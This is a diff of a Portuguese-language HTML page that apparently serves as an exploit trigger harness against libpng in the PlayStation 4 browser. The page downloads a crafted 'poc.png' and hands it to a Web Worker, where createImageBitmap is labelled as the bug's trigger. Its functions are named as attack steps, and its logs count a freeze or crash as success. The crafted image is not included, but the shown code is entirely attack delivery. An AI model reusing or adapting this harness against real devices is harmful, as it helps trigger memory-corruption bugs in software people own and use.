@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 LibPNG CPU Force</title>
+    <title>PS4 LibPNG CPU Force (Fixed)</title>
     <style>
         body { background: #000; color: #fff; font-family: monospace; text-align: center; padding-top: 40px; }
         button { background: #d50000; color: white; border: 2px solid white; padding: 20px 40px; font-size: 24px; cursor: pointer; font-weight: bold; }
@@ -11,13 +11,13 @@
 </head>
 <body>
 
-    <h1>LIBPNG16 - CPU DECODE TEST</h1>
-    <p>Estratégia: Web Worker + createImageBitmap (Bypass GPU)</p>
-    <p>Arquivo alvo: <b>poc.png</b> (Gerado na V10)</p>
+    <h1>LIBPNG16 - CPU DECODE (NO NETWORK)</h1>
+    <p>Estratégia: Main Thread baixa -> Worker Decodifica</p>
+    <p>Arquivo alvo: <b>poc.png</b> (V10)</p>
 
-    <button onclick="iniciarAtaque()">INICIAR DECODIFICAÇÃO (WORKER)</button>
+    <button onclick="prepararAtaque()">INICIAR DECODIFICAÇÃO</button>
     
-    <div id="log">Status do sistema...</div>
+    <div id="log">Aguardando...</div>
 
     <script>
         function log(msg) {
@@ -25,32 +25,43 @@
             el.innerHTML += "<div>[" + new Date().toLocaleTimeString() + "] " + msg + "</div>";
         }
 
-        function iniciarAtaque() {
-            log("Criando Web Worker para isolar decodificação...");
+        function prepararAtaque() {
+            log("1. Main Thread: Baixando imagem para a memória RAM...");
             
-            // Criamos o código do Worker dinamicamente
-            // Isso roda numa thread separada (sem GPU), forçando a libpng da CPU.
+            // A thread principal baixa o arquivo (ela tem permissão de rede)
+            fetch("poc.png?t=" + Math.random())
+            .then(response => {
+                if (!response.ok) throw new Error("Erro ao baixar poc.png (404?)");
+                return response.blob();
+            })
+            .then(blob => {
+                log("2. Download concluído (" + blob.size + " bytes).");
+                iniciarWorker(blob);
+            })
+            .catch(err => {
+                log("ERRO DE DOWNLOAD: " + err.message);
+            });
+        }
+
+        function iniciarWorker(blobImagem) {
+            log("3. Criando Web Worker...");
+            
+            // Código do Worker: Agora ele recebe o BLOB direto, não uma URL.
+            // Não faz fetch, apenas processa.
             var workerCode = `
                 self.onmessage = function(e) {
-                    var url = e.data;
-                    console.log("Worker: Baixando imagem...");
+                    var blob = e.data;
+                    console.log("Worker: Recebi os dados brutos.");
                     
-                    fetch(url)
-                    .then(response => response.blob())
-                    .then(blob => {
-                        console.log("Worker: Blob recebido (" + blob.size + " bytes).");
-                        console.log("Worker: Iniciando createImageBitmap() - O GATILHO...");
-                        
-                        // Esta função força a decodificação completa do PNG em memória RAM (Heap)
-                        // Se a libpng estiver vulnerável, o processo deve morrer aqui.
-                        return createImageBitmap(blob);
-                    })
+                    // O GATILHO DO BUG
+                    // Tenta converter o Blob (PNG V10) em Bitmap usando a CPU
+                    createImageBitmap(blob)
                     .then(bitmap => {
-                        postMessage("SUCESSO: Imagem decodificada. Tamanho: " + bitmap.width + "x" + bitmap.height);
+                        postMessage("FALHA: O Worker sobreviveu. Imagem decodificada: " + bitmap.width + "x" + bitmap.height);
                         bitmap.close();
                     })
                     .catch(err => {
-                        postMessage("ERRO: " + err.message);
+                        postMessage("ERRO DE DECODE: " + err.message);
                     });
                 };
             `;
@@ -60,20 +71,22 @@
             var worker = new Worker(workerUrl);
 
             worker.onmessage = function(e) {
-                if (e.data.startsWith("SUCESSO")) {
+                if (e.data.startsWith("FALHA")) {
                     log("❌ " + e.data);
-                    log("O Worker sobreviveu. A libpng processou o arquivo sem crash.");
                 } else {
                     log("⚠️ " + e.data);
                 }
             };
 
             worker.onerror = function(e) {
-                log("☠️ ERRO NO WORKER (Crash?)");
+                log("☠️ ERRO NO WORKER (Isso pode ser um Crash silencioso)");
             };
 
-            log("Enviando poc.png para o Worker...");
-            worker.postMessage("poc.png?t=" + Math.random());
+            log("4. Enviando DADOS da imagem para o Worker...");
+            log("Se travar agora, BINGO.");
+            
+            // Passa o arquivo binário direto para o Worker
+            worker.postMessage(blobImagem);
         }
     </script>
 </body>
